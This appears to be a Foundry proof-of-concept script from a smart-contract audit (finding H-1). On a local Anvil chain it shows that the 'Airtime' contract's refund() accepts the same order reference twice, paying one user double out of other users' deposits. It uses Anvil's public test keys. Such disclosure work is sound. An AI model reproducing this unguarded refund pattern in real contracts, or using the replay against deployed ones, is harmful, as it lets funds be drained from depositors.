// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Airtime} from "../src/Airtime.sol";
import {ERC20Permit} from "lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

/// @dev Minimal mock USDC — deployed locally on Anvil since real USDC doesn't exist there
contract MockUSDC is ERC20Permit {
    constructor() ERC20("USD Coin", "USDC") ERC20Permit("USD Coin") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

/// @notice H-1 Double Refund Demo on Anvil.
/// Deploys MockUSDC + Airtime, funds 3 honest users, then proves the treasury
/// can call refund() twice with the same orderRef — draining other users' funds.
contract AttackDoubleRefund is Script {

    // Anvil default accounts (deterministic)
    uint256 constant OWNER_KEY  = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 constant USER_A_KEY = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;
    uint256 constant USER_B_KEY = 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a;
    uint256 constant USER_C_KEY = 0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6;

    uint256 constant DEPOSIT_AMOUNT = 100e18; // 100 USDC each

    function run() external {
        address owner  = vm.addr(OWNER_KEY);
        address userA  = vm.addr(USER_A_KEY);
        address userB  = vm.addr(USER_B_KEY);
        address userC  = vm.addr(USER_C_KEY);

        // ── Step 1: Deploy contracts ────────────────────────────────────────
        vm.startBroadcast(OWNER_KEY);
        MockUSDC usdc   = new MockUSDC();
        Airtime  airtime = new Airtime(address(usdc), owner);

        // Mint 100 USDC to each honest user
        usdc.mint(userA, DEPOSIT_AMOUNT);
        usdc.mint(userB, DEPOSIT_AMOUNT);
        usdc.mint(userC, DEPOSIT_AMOUNT);
        vm.stopBroadcast();

        console.log("=== H-1: DOUBLE REFUND SETUP ===");
        console.log("Airtime contract :", address(airtime));
        console.log("MockUSDC         :", address(usdc));
        console.log("Treasury (owner) :", owner);
        console.log("UserA            :", userA);
        console.log("UserB            :", userB);
        console.log("UserC            :", userC);

        // ── Step 2: Three honest users approve and deposit ──────────────────
        vm.startBroadcast(USER_A_KEY);
        usdc.approve(address(airtime), DEPOSIT_AMOUNT);
        airtime.deposit("ORDER-A", DEPOSIT_AMOUNT);
        vm.stopBroadcast();

        vm.startBroadcast(USER_B_KEY);
        usdc.approve(address(airtime), DEPOSIT_AMOUNT);
        airtime.deposit("ORDER-B", DEPOSIT_AMOUNT);
        vm.stopBroadcast();

        vm.startBroadcast(USER_C_KEY);
        usdc.approve(address(airtime), DEPOSIT_AMOUNT);
        airtime.deposit("ORDER-C", DEPOSIT_AMOUNT);
        vm.stopBroadcast();

        console.log("");
        console.log("---------- BEFORE ATTACK ----------");
        console.log("Contract USDC balance : 300 USDC (3 users x 100)");
        console.log("UserA USDC balance    : 0 (deposited)");

        // ── Step 3: Treasury correctly refunds userA once (ORDER-A failed) ──
        vm.startBroadcast(OWNER_KEY);
        airtime.refund("ORDER-A", userA, DEPOSIT_AMOUNT);
        vm.stopBroadcast();

        console.log("");
        console.log("--- AFTER LEGITIMATE REFUND (ORDER-A, first time) ---");
        console.log("UserA should have    : 100 USDC");

        // ── Step 4: BUG — same ORDER-A refunded again ───────────────────────
        // No on-chain guard prevents this. Contract processes it silently.
        vm.startBroadcast(OWNER_KEY);
        airtime.refund("ORDER-A", userA, DEPOSIT_AMOUNT);
        vm.stopBroadcast();

        console.log("");
        console.log("---------- AFTER DOUBLE REFUND ----------");
        console.log("UserA USDC balance    : 200 USDC (paid TWICE for one order)");
        console.log("Contract USDC balance : 100 USDC (userB or userC funds stolen)");
        console.log("");
        console.log("CONFIRMED: refund() accepted ORDER-A a second time.");
        console.log("No on-chain check exists. Other users' deposits cover the duplicate.");
        console.log("=========================================");
    }
}
